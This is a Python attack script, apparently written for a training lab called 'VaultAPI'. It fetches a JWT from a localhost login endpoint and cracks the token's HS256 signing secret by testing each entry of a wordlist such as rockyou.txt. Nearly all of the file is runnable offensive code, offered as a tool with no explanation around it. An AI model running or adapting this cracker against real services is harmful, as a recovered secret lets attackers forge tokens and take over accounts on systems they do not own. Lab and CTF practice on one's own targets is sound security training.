#!/usr/bin/env python3
"""
JWT HMAC secret cracker — for the VaultAPI lab.
Grabs a token from /login, then tries wordlist entries as the HS256 secret.
"""
import sys
import requests
import jwt  # PyJWT
from jwt.exceptions import InvalidSignatureError, PyJWTError

BASE = "http://localhost:9002"  # adjust to your lab's host/port

def get_token():
    try:
        r = requests.post(f"{BASE}/api/login", json={"username": "alice", "password": "Password123"})
        r.raise_for_status()
        return r.json()["token"]
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection failed to {BASE}: {e}")
        sys.exit(1)

def crack(token, wordlist_path):
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                secret = line.strip()
                if not secret:
                    continue
                try:
                    # decode automatically verifies the signature using the provided secret
                    jwt.decode(token, secret, algorithms=["HS256"])
                    return secret  # verification succeeded → correct secret
                except InvalidSignatureError:
                    continue  # wrong secret, keep going
                except PyJWTError:
                    # e.g. expired/other claim issue, but signature matched
                    return secret
    except FileNotFoundError:
        print(f"[-] Wordlist file not found: {wordlist_path}")
        sys.exit(1)
    return None

if __name__ == "__main__":
    wordlist = sys.argv[1] if len(sys.argv) > 1 else "rockyou.txt"
    
    print(f"[*] Fetching token from {BASE}...")
    token = get_token()
    print(f"[+] Token: {token}")
    
    print(f"[*] Trying secrets from {wordlist} ...")
    found = crack(token, wordlist)
    
    if found:
        print(f"[+] SECRET FOUND: {found}")
    else:
        print("[-] Not found. Try a bigger wordlist.")
